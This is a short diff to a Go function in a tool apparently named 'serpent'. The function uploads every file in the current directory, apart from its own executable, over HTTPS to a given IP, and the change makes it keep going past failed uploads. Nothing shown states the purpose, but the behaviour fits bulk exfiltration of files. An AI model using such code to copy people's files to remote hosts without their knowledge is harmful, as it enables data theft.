@@ -47,7 +47,8 @@ func SendAllFiles(ip string) error {
 		return fmt.Errorf("failed to read current directory: %w", err)
 	}
 
-	// Send each file
+	// Send each file, continue on error, collect errors
+	var failed []string
 	for _, entry := range entries {
 		if entry.IsDir() {
 			continue // Skip directories
@@ -56,11 +57,16 @@ func SendAllFiles(ip string) error {
 			continue // Skip the serpent executable itself
 		}
 		filePath := entry.Name()
+		fmt.Printf("Attempting to send file: %s\n", filePath)
 		url := "https://" + ip
 		err := https.SendFile(url, filePath)
 		if err != nil {
-			return fmt.Errorf("failed to send %s: %w", filePath, err)
+			fmt.Printf("Failed to send %s: %v\n", filePath, err)
+			failed = append(failed, filePath+": "+err.Error())
 		}
+	}
+	if len(failed) > 0 {
+		return fmt.Errorf("failed to send files: %v", failed)
 	}
 	return nil
 }
